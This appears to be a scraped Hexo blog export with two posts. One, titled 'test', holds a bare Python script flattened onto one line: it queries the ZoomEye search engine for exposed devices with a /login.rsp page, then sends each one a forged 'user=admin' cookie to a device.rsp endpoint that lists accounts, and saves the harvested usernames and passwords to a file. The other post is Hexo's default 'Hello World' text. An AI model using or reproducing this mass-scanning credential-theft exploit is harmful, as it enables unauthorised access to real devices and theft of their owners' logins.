entry.title: test
entry.content: testtest testtesttesttesttesttesttesttesttesttest 123456789101112131415161718192021222324252627282930313233import requests,json,sys,timedef zoomeye(): url = 'https://api.zoomeye.org/user/login' data = {"username": "x","password": "x"} req = requests.post(url,data=json.dumps(data)) x = 'JWT '+eval(req.text).get('access_token') for i in range(501): time.sleep(1) url = 'https://api.zoomeye.org/host/search?query=/login.rsp&page='+str(i+1) s = requests.get(url,headers={'Authorization': x}) z =json.loads(s.text).get('matches')<!-- more --> for i in range(100): try: print i ss = str(z[i].get('ip')+':'+str(z[i].get('portinfo').get('port'))) url = "http://"+ss.strip()+"/login.rsp" url1 ="http://"+ss.strip()+"/device.rsp?opt=user&cmd=list" s1 = requests.get(url1,headers={'Cookie':'user=admin'}) c = s1.json() uid = c.get('list')[0].get('uid') pwd = c.get('list')[0].get('pwd') with open("result.txt",'a') as y: y.write(url+ ' Username: '+uid+' Password:'+pwd+'\n') except: passif __name__ == '__main__': zoomeye()

entry.title: Hello World
entry.content: Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment
